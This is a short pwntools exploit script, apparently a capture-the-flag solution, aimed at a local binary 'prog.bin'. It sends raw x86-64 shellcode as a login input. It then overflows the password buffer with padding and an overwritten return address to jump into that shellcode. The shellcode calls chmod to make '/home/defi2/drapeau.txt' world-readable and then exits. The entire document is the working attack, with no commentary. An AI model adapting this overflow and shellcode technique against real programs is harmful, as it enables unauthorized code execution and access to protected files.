
from pwn import *
import struct

addr = struct.pack('<Q', 0x400538)

addr = addr[:7]

login = '\x48\x83\xc0\x10\xff\xe0\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\x48\x31\xd2\x48\x31\xf6\x66\xbe\x24\x01\x48\xbb\xff\x65\x61\x75\x2e\x74\x78\x74\x48\xc1\xeb\x08\x53\x48\xbb\x66\x69\x32\x2f\x64\x72\x61\x70\x53\x48\xbb\x2f\x68\x6f\x6d\x65\x2f\x64\x65\x53\x48\x89\xe7\x48\x31\xc0\xb0\x5a\x0f\x05\x48\x31\xff\x48\x31\xc0\xb0\x3c\x0f\x05'

passwd = 'z1Z@' + 'X' * (56 - 4) + addr

proc = process('prog.bin')

proc.sendline(login)

proc.sendline(passwd)
